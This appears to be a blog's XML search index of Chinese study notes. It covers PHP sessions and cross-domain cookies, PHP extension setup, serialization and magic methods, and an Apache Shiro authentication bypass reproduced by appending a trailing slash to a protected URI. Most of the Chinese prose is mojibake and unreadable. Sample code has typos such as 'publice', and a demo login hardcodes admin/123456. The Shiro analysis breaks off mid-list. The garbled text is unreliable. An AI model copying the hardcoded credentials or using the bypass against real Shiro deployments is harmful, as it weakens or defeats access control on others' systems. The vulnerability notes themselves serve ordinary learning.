<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>php cookie</title>
    <url>/2020/07/12/php_cookie/</url>
    <content><![CDATA[<hr>
<h3 id="php-cookie"><a href="#php-cookie" class="headerlink" title="php cookie"></a>php cookie</h3><h5 id="Cookieä¸Session"><a href="#Cookieä¸Session" class="headerlink" title="Cookieä¸Session"></a>Cookieä¸Session</h5><ul>
<li>session.save_path=â€D:\phpStudy\tmp\tmpâ€</li>
<li>è¯·æ±‚ç½‘ç«™å¦‚æœCOOKIEæ²¡æœ‰PHPSESSID é‚£æœåŠ¡å™¨å°±ç»™ä½ å®šä¹‰ä¸€ä¸ªPHPSESSID<br>å¦‚æœè¯·æ±‚ç½‘ç«™æœ‰PHPSESSIDï¼ŒæœåŠ¡å™¨çœ‹åˆ°äº†PHPSESSIDä¹‹åè·å–PHPSESSIDçš„å†…å®¹å»æ‰¾sessionIDçš„å†…å®¹åå­—çš„æ–‡ä»¶åã€‚</li>
<li>sessionæ“ä½œ</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();  //ä¼šè¯å¼€å§‹</span><br><span class="line">    $username = empty($_POST[&apos;username&apos;])? &quot;&quot; : $_POST[&apos;username&apos;];</span><br><span class="line">    $password = empty($_POST[&apos;password&apos;])? &quot;&quot; : $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($_SESSION[&apos;username&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;1&apos;;</span><br><span class="line">    &#125;elseif($username == &apos;admin&apos; and $password == &apos;123456&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ç™»é™†æˆåŠŸ&quot;;</span><br><span class="line">        $_SESSION[&apos;username&apos;]=&apos;1&apos;;  //å†™å…¥sessionæ–‡ä»¶</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include_once &apos;./form.html&apos;;  //åŒ…å«è¡¨å•</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="Cookieè·¨åŸŸ"><a href="#Cookieè·¨åŸŸ" class="headerlink" title="Cookieè·¨åŸŸ"></a>Cookieè·¨åŸŸ</h5><ul>
<li>é»˜è®¤çš„ï¼Œcookieåªèƒ½å¯¹å½“å‰åŸŸåï¼ˆå®Œæ•´åŸŸåï¼šæœ‰æ•ˆçš„äºŒçº§åŸŸåï¼‰æœ‰æ•ˆ</li>
<li>cookieè·¨åŸŸï¼šæŒ‡çš„æ˜¯å…è®¸cookieåœ¨ä¸åŒçš„äºŒçº§åŸŸåä¹‹é—´å…±äº«ï¼ˆä¸€çº§åŸŸåä¸€è‡´ï¼‰</li>
<li>PHPè®¾ç½®COOKIE</li>
<li>SetCookie(â€œåå­—â€,å€¼,æœ‰æ•ˆæ—¶é—´,â€™æœ‰æ•ˆè·¯å¾„â€™,â€™æœ‰æ•ˆåŸŸâ€™);</li>
<li>SetCookie(â€˜PHPSESSIDâ€™,session_id(),time()+100,â€™/â€˜,â€xss.cnâ€);</li>
<li>â–² session.auto_start = 0  //åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œé»˜è®¤ä¸å¼€å¯session_start()</li>
<li>â–² session.name = PHPSESSID  //è·¨åŸŸè¦è®¾ç½®Cookieçš„åç§°</li>
<li>â–² session.cookie_domain =   //cookieçš„è·¨åŸŸï¼Œé»˜è®¤ä¸ºç©ºä¸èƒ½è·¨åŸŸ</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //å‘é€cookie-1</span><br><span class="line">    session_start();</span><br><span class="line">    Setcookie(&apos;name&apos;,&apos;xindong&apos;,time()+100,&apos;/&apos;,&apos;127.0.0.1&apos;);</span><br><span class="line">    echo session_id();  //è¾“å‡ºcookie</span><br><span class="line"></span><br><span class="line">    //å‘é€cookie-2</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;name&apos;] = &apos;xindong&apos;;</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line">    Setcookie(&apos;name&apos;,session_id(),time()+100,&apos;/&apos;,&apos;127.0.0.1&apos;);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="è·¨åŸŸå°è¯•"><a href="#è·¨åŸŸå°è¯•" class="headerlink" title="è·¨åŸŸå°è¯•"></a>è·¨åŸŸå°è¯•</h5><ul>
<li>åˆ é™¤session</li>
<li>è™šæ‹Ÿä¸»æœº/hostsæ–‡ä»¶ -&gt; <a href="http://www.test1mzt.com/cookie.www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com/cookie.www.test1mzt.com</a></li>
<li>è®¾ç½®cookieçš„åŸŸ -&gt; <a href="http://www.test1mzt.comï¼ˆwww.test1mzt.comä¸‹çš„1.phpï¼‰" target="_blank" rel="noopener">www.test1mzt.comï¼ˆwww.test1mzt.comä¸‹çš„1.phpï¼‰</a></li>
<li>æ‰“å°cookie -&gt; cookie.<a href="http://www.test1mzt.comï¼ˆcookie.www.test1mzt.comçš„1.phpï¼‰" target="_blank" rel="noopener">www.test1mzt.comï¼ˆcookie.www.test1mzt.comçš„1.phpï¼‰</a></li>
<li>è®¿é—®<a href="http://www.test1mzt.comå°è¯•" target="_blank" rel="noopener">www.test1mzt.comå°è¯•</a> -&gt; æ˜¯å¦è¾“å‡ºxindong</li>
<li>è®¿é—®cookie.<a href="http://www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com</a> -&gt; æ˜¯å¦è¾“å‡ºä¸ºxindong</li>
<li>/test1/1.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;name&apos;] = &apos;xindong&apos;;</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line">    var_dump(session_id());</span><br><span class="line">    Setcookie(&apos;PHPSESSID&apos;,session_id(),time()+100,&apos;/&apos;,&apos;www.test1mzt.com&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>/cookie.test1/1.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    var_dump(session_id());</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>phpçš„æ‰©å±•</title>
    <url>/2020/07/12/php_extension/</url>
    <content><![CDATA[<hr>
<h2 id="phpçš„æ‰©å±•"><a href="#phpçš„æ‰©å±•" class="headerlink" title="phpçš„æ‰©å±•"></a>phpçš„æ‰©å±•</h2><ul>
<li>CURLæ‰©å±•</li>
<li>opensslæ‰©å±•</li>
<li>Redisä»¥åŠæ‰©å±•<ul>
<li>Redis For Winodow</li>
<li>Redis For Linux</li>
<li>Redisæ“ä½œæ‰‹å†Œ</li>
</ul>
</li>
</ul>
<h3 id="0X00-CURLæ‰©å±•"><a href="#0X00-CURLæ‰©å±•" class="headerlink" title="0X00 CURLæ‰©å±•"></a>0X00 CURLæ‰©å±•</h3><ul>
<li>â–² 2020.03.15 ç½‘ä¸Šçœ‹åˆ°äº†å¾ˆå¤šå…³äºWindowç¯å¢ƒå¼€å¯curlçš„æ–¹æ³•ï¼Œä½†éƒ½å­˜åœ¨ä¸€å®šé—®é¢˜</li>
<li>phpå¼€å¯æ‰©å±•ï¼ˆphp.iniï¼‰<ul>
<li>extension=curl</li>
</ul>
</li>
<li>â–² curlåŠ è½½ï¼šæ‰¾åˆ°å¯¹åº”phpç›®å½•ä¸‹libssh2.dllæ–‡ä»¶ï¼Œå¤åˆ¶åˆ°å¯¹åº”apacheçš„binæ–‡ä»¶å¤¹ä¸‹</li>
<li>é‡å¯Apacheï¼ŒæŸ¥çœ‹phpinfoï¼Œæ˜¯å¦æœ‰Curl</li>
<li>php_curl_test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     var_dump(curl_init());  //è¾“å‡ºä¸º resource(2) of type (curl) </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php_extension/curl_install.png" alt="CURL_install"></p>
<h3 id="0x01-opensslæ‰©å±•"><a href="#0x01-opensslæ‰©å±•" class="headerlink" title="0x01 opensslæ‰©å±•"></a>0x01 opensslæ‰©å±•</h3><ul>
<li>â–² å¯¹äºç°åœ¨å¤§å¤šæ•°ç½‘ç«™æ¥è¯´ï¼Œéƒ½æ˜¯httpsæ¨¡å¼ï¼Œçˆ¬è™«éœ€è¦å¼€å¯opensslæ‰©å±•å»ºç«‹è¿æ¥</li>
<li>phpå¼€å¯æ‰©å±•ï¼ˆphp.iniæ–‡ä»¶ï¼‰<ul>
<li>extension=php_openssl</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php_extension/openssl_install.png" alt="openssl_install"></p>
<h3 id="0X02-Redisä»¥åŠæ‰©å±•"><a href="#0X02-Redisä»¥åŠæ‰©å±•" class="headerlink" title="0X02 Redisä»¥åŠæ‰©å±•"></a>0X02 Redisä»¥åŠæ‰©å±•</h3><h5 id="Redis-For-Winodow"><a href="#Redis-For-Winodow" class="headerlink" title="Redis For Winodow"></a>Redis For Winodow</h5><ul>
<li>â–² 2020.03.15 Redis for Windowå®˜æ–¹å·²ç»åœæ­¢ç»´æŠ¤</li>
<li>â–² Redisé»˜è®¤ç«¯å£ä¸º6379ï¼Œé»˜è®¤å¯†ç ä¸ºç©ºå¯†ç </li>
<li>RedisåºŸå¼ƒå‡½æ•°æ›¿æ¢ï¼š<a href="https://blog.csdn.net/xchenhao/article/details/97251618" target="_blank" rel="noopener">https://blog.csdn.net/xchenhao/article/details/97251618</a></li>
<li>Redis -&gt; Githubçš„ç»´æŠ¤ä»“åº“ï¼š<a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">https://github.com/microsoftarchive/redis/releases</a></li>
<li>Rediså®˜æ–¹æ–‡æ¡£ -&gt; for window <a href="https://www.redis.com.cn/redis-installation" target="_blank" rel="noopener">https://www.redis.com.cn/redis-installation</a></li>
<li>Redisæ‰©å±• -&gt; peclçš„ç»´æŠ¤ä»“åº“ï¼š<a href="http://pecl.php.net/package/redis" target="_blank" rel="noopener">http://pecl.php.net/package/redis</a></li>
<li>Peclä»“åº“ä¸‹è½½ -&gt; <a href="https://windows.php.net/downloads/pecl/" target="_blank" rel="noopener">https://windows.php.net/downloads/pecl/</a></li>
<li>ä¸‹è½½Redis.msiå®‰è£…æ–‡ä»¶ï¼Œä¸‹è½½Redisæ‰©å±•ï¼ˆå¯¹åº”PHPç‰ˆæœ¬ï¼‰</li>
<li>æ‹·è´redisçš„æ‰©å±•php_redis.dll -&gt; php/ext</li>
<li>phpå¼€å¯æ‰©å±•ï¼ˆphp.iniæ–‡ä»¶ï¼‰<ul>
<li>extension=php_redis.dll</li>
</ul>
</li>
<li>é‡å¯Apacheï¼ŒæŸ¥çœ‹phpinfoï¼Œæ˜¯å¦æœ‰Redis</li>
<li>window_php_redis_test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     $redis = new Redis();                   //rediså¯¹è±¡</span><br><span class="line">     $redis-&gt;connect(&quot;127.0.0.1&quot;,&quot;6379&quot;); //è¿æ¥redisæœåŠ¡å™¨</span><br><span class="line">     $redis-&gt;set(&quot;test&quot;,&quot;Hello World&quot;);      //setå­—ç¬¦ä¸²å€¼</span><br><span class="line">     echo $redis-&gt;get(&quot;test&quot;);               //è·å–å€¼</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php_extension/redis_for_window.png" alt="redis_for_windows"></p>
<h5 id="Redis-For-Linux"><a href="#Redis-For-Linux" class="headerlink" title="Redis For Linux"></a>Redis For Linux</h5><ul>
<li>Rediså®‰è£…ï¼š<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a> ï¼ˆè‡ªå®‰è£…çµæ´»æ€§è¾ƒå¤§ï¼‰</li>
<li>phpçš„redisæ‰©å±•ï¼š<a href="https://github.com/phpredis/phpredis/releases" target="_blank" rel="noopener">https://github.com/phpredis/phpredis/releases</a></li>
<li>å®‰è£…redisæ‰©å±•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xzf phpredis-xxx.tar.gz</span><br><span class="line">cd phpredis </span><br><span class="line">sudo phpize </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<ul>
<li>å°†modulesæ–‡ä»¶å¤¹çš„å†…å®¹å¤åˆ¶å¹¶ç²˜è´´åˆ°PHPæ‰©å±•ç›®å½•ä¸­ï¼Œå¹¶åœ¨php.iniä¸­æ·»åŠ ä»¥ä¸‹è¡Œ<ul>
<li><code>extension = redis.so</code> </li>
</ul>
</li>
<li>linux_php_redis_test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis(); </span><br><span class="line">    $redis-&gt;connect(&apos;127.0.0.1&apos;, 6379); </span><br><span class="line">    echo &quot;Server is running: &quot;.$redis-&gt;ping();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/php_extension/redis_for_linux.png" alt="redis_for_linux"></p>
<h5 id="Redisæ“ä½œæ‰‹å†Œ"><a href="#Redisæ“ä½œæ‰‹å†Œ" class="headerlink" title="Redisæ“ä½œæ‰‹å†Œ"></a>Redisæ“ä½œæ‰‹å†Œ</h5><ul>
<li>phpredisï¼š<a href="https://github.com/phpredis/phpredis" target="_blank" rel="noopener">https://github.com/phpredis/phpredis</a></li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>phpåºåˆ—åŒ–</title>
    <url>/2020/07/12/php_serialize_unserialize/</url>
    <content><![CDATA[<hr>
<h3 id="phpåºåˆ—åŒ–"><a href="#phpåºåˆ—åŒ–" class="headerlink" title="phpåºåˆ—åŒ–"></a>phpåºåˆ—åŒ–</h3><blockquote>
<p>   â–² å¯¹è±¡çš„åºåˆ—åŒ–åˆ©äºå¯¹è±¡çš„ä¿å­˜å’Œä¼ è¾“ï¼Œä¹Ÿå¯ä»¥è®©å¤šä¸ªæ–‡ä»¶å…±äº«å¯¹è±¡</p>
<p>   phpåºåˆ—åŒ–çš„å‡½æ•°ä¸ºserializeï¼Œååºåˆ—åŒ–çš„å‡½æ•°ä¸ºunserialize</p>
</blockquote>
<h5 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h5><ul>
<li>phpåºåˆ—åŒ–æ˜¯ä¸ºäº†åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­å¯¹å¯¹è±¡è¿›è¡Œè½¬å‚¨è€Œäº§ç”Ÿçš„ã€‚åºåˆ—åŒ–å¯ä»¥å°†å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä½†ä»…ä¿ç•™å¯¹è±¡é‡Œçš„æˆå‘˜å˜é‡ï¼Œä¸ä¿ç•™å‡½æ•°æ–¹æ³•</li>
<li>ä¾‹å­<ul>
<li>Oä»£è¡¨æ˜¯å¯¹è±¡ï¼Œè¡¨ç¤ºæ”¹å¯¹è±¡åç§°æœ‰4ä¸ªå­—ç¬¦ï¼Œâ€Testâ€è¡¨ç¤ºæ”¹å¯¹è±¡çš„åç§°ï¼Œ3è¡¨ç¤ºæ”¹å¯¹è±¡é‡Œæœ‰3ä¸ªæˆå‘˜</li>
<li>å˜é‡çš„åºåˆ—åŒ–<ul>
<li>publicå±æ€§åºåˆ—åŒ–åä¸ºæœ¬èº«</li>
<li>protectedå±æ€§åºåˆ—åŒ–åç¤ºæ–¹å¼æ˜¯åœ¨å˜é‡åå‰åŠ ä¸ª%00*%00</li>
<li>privateå±æ€§åºåˆ—åŒ–åç¤ºæ–¹å¼æ˜¯åœ¨å˜é‡åå‰åŠ ä¸ª%00ç±»å%00</li>
</ul>
</li>
<li>æ‹¬å·é‡Œé¢çš„å€¼æ ¹æ®åˆ†å·æ¥åˆ†å¼€çœ‹ï¼Œåˆ†å·å·¦è¾¹çš„æ˜¯å˜é‡åï¼Œåˆ†å·å³è¾¹çš„æ˜¯å˜é‡çš„å€¼</li>
<li>â–² åºåˆ—åŒ–ä¸ä¿å­˜æ–¹æ³•</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);</span><br><span class="line">    var_dump($sTest);  </span><br><span class="line">    // è¾“å‡ºä¸ºstring(96) &quot;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:9:&quot;This is A&quot;;s:4:&quot;*b&quot;;s:9:&quot;This is B&quot;;s:7:&quot;Testc&quot;;s:9:&quot;This is C&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    è§£é‡Š</span><br><span class="line">    O ä»£è¡¨å¯¹è±¡ å› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ åºåˆ—åŒ–æ•°ç»„åˆ™ç”¨Aæ¥è¡¨ç¤º</span><br><span class="line">    4 ä»£è¡¨ç±»åå­—å ä¸‰ä¸ªå­—ç¬¦ </span><br><span class="line">    Test ç±»å</span><br><span class="line">    3 ä»£è¡¨ä¸‰ä¸ªå±æ€§</span><br><span class="line">    s ä»£è¡¨å­—ç¬¦ä¸²</span><br><span class="line">    1 ä»£è¡¨å±æ€§åé•¿åº¦</span><br><span class="line">    a å±æ€§å</span><br><span class="line">    s:9:&quot;This is A&quot; å­—ç¬¦ä¸² å±æ€§å€¼é•¿åº¦ å±æ€§å€¼</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<h5 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h5><ul>
<li>ä¾‹å­</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);   </span><br><span class="line">    $uTest = unserialize($sTest);</span><br><span class="line">    var_dump($uTest);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //è¾“å‡ºï¼Œè¿˜åŸæˆä¸€ä¸ªæ•°ç»„</span><br><span class="line">    object(Test)#2 (3) &#123;</span><br><span class="line">      [&quot;a&quot;]=&gt;</span><br><span class="line">      string(9) &quot;This is A&quot;</span><br><span class="line">      [&quot;b&quot;:protected]=&gt;</span><br><span class="line">      string(9) &quot;This is B&quot;</span><br><span class="line">      [&quot;c&quot;:&quot;Test&quot;:private]=&gt;</span><br><span class="line">      string(9) &quot;This is C&quot;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h5><ul>
<li>å®˜ç½‘åœ°å€ï¼š<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></li>
<li>__construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</li>
<li>__destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</li>
<li>__toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨<ul>
<li>â–² __toString()åˆ™å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</li>
</ul>
</li>
<li>__sleep()åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ<ul>
<li>â–² __sleep()æœŸæœ›èƒ½returnä¸€ä¸ªæ•°ç»„</li>
</ul>
</li>
<li>__wakeup()åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè¢«è°ƒç”¨</li>
<li>__get()è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶è¢«è°ƒç”¨</li>
<li>__invoke()å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è¢«è°ƒç”¨</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>Shiroæƒé™ç»•è¿‡æ¼æ´</title>
    <url>/2020/08/30/shiro_privilge_bypass/</url>
    <content><![CDATA[<h3 id="Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰"><a href="#Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰" class="headerlink" title="Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰"></a>Shiroæƒé™ç»•è¿‡æ¼æ´ï¼ˆShiro-682ï¼‰</h3><blockquote>
<p>CVE-2020-1597</p>
</blockquote>
<h5 id="å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-5-2"><a href="#å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-5-2" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.5.2"></a>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.5.2</h5><h5 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h5><ul>
<li>ç”±äºShiroçš„æ‹¦æˆªå™¨å’ŒSpring(Servlet)æ‹¦æˆªå™¨å¯¹äºURIæ¨¡å¼åŒ¹é…çš„å·®å¼‚ï¼Œå¯¼è‡´é‰´æƒé—®é¢˜</li>
</ul>
<h5 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h5><ul>
<li>åœ¨Springæ¡†æ¶ä¸‹uri = uri + â€˜/â€™å¯ä»¥ç»•è¿‡Shiroé˜²æŠ¤<ul>
<li>åœ¨Spring webé¡¹ç›®ä¸­ï¼Œè¯·æ±‚URI/resource/menuså’ŒURI/resource/menus/éƒ½å¯ä»¥è®¿é—®åˆ°æœåŠ¡å™¨çš„èµ„æº</li>
<li>åœ¨Shiroä¸­çš„URLè·¯å¾„è¡¨è¾¾å¼pathPatternå¯ä»¥æ­£ç¡®åŒ¹é…åˆ°/resource/menusï¼Œä½†ä¸èƒ½æ­£ç¡®åŒ¹é…/resource/menusï¼Œå¯¼è‡´è¿‡æ»¤æ— æ³•æ­£ç¡®åŒ¹é…ï¼Œç»•è¿‡äº†Shiroçš„é˜²æŠ¤æœºåˆ¶</li>
</ul>
</li>
<li>Shiroæ‹¦æˆªå™¨<ul>
<li>Shiroæ¡†æ¶é€šè¿‡æ‹¦æˆªå™¨åŠŸèƒ½æ¥å®ç°å¯¹ç”¨æˆ·è®¿é—®æƒé™çš„æ§åˆ¶å’Œæ‹¦æˆª<ul>
<li>anonä¸ºåŒ¿åæ‹¦æˆªå™¨ï¼Œä¸éœ€è¦ç™»é™†å°±èƒ½è®¿é—®ï¼Œä¸€èˆ¬ç”¨äºé™æ€èµ„æºæˆ–è€…ç§»åŠ¨æ¥å£ -&gt; <code>/index.html = anon</code></li>
<li>authcä¸ºç™»é™†æ‹¦æˆªå™¨ï¼Œéœ€è¦ç™»é™†è®¤è¯æ‰èƒ½è®¿é—®åˆ°çš„èµ„æº  -&gt;<code>/user/** = authc</code></li>
</ul>
</li>
<li>Shiroçš„URLè·¯å¾„è¡¨è¾¾å¼ä¸ºAntæ ¼å¼ï¼Œè·¯å¾„é€šé…ç¬¦æ”¯æŒ<code>? * **</code><ul>
<li><code>?</code>ï¼šåŒ¹é…ä¸€ä¸ªå­—ç¬¦</li>
<li><code>*</code>ï¼šåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</li>
<li><code>**</code>ï¼šåŒ¹é…è·¯å¾„ä¸­çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h5><ul>
<li>Shiroç‰ˆæœ¬</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹ShiroConfigé…ç½®æ–‡ä»¶ï¼Œæ·»åŠ authcæ‹¦æˆªå™¨çš„æ‹¦æˆªæ­£åˆ™</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@Bean</span><br><span class="line">ShiroFilterFactoryBean shiroFilterFactoryBean() &#123;</span><br><span class="line">    ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    //map.put("/*", "authc");</span><br><span class="line">    map.put("/hello/*", "authc"); </span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    return bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹è·¯ç”±æ§åˆ¶æ–¹æ³•</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@GetMapping("/hello/&#123;currentPage&#125;")</span><br><span class="line">    public String hello(@PathVariable Integer currentPage) &#123;</span><br><span class="line">        return "hello";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯åŠ¨åº”ç”¨<ul>
<li>è®¿é—®/hello/1æ¥å£ï¼Œä¼šè¢«authcæ‹¦æˆªå™¨æ‹¦æˆªï¼Œä¼šè·³è½¬åˆ°ç™»å½•æ¥å£è¿›è¡Œç™»å½•</li>
<li>è®¿é—®/hello/1/ï¼ŒæˆåŠŸç»•è¿‡authcæ‹¦æˆªå™¨æ‹¦æˆªï¼Œç›´æ¥è·å–åˆ°èµ„æº</li>
</ul>
</li>
<li>â–² 2020-08-22 æœ¬å®éªŒå› ä¸ºç¯å¢ƒé—®é¢˜ï¼Œæš‚æ— è¿›è¡Œè¯•éªŒ</li>
</ul>
<h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><ul>
<li><p>PathMatchingFilterChainResolverä¸‹çš„getChainå‡½æ•°</p>
<ul>
<li>æ ¹æ®URLè·¯å¾„åŒ¹é…ä¸­é…ç½®çš„urlè·¯å¾„è¡¨è¾¾å¼æ¥åŒ¹é…è¾“å…¥çš„URL</li>
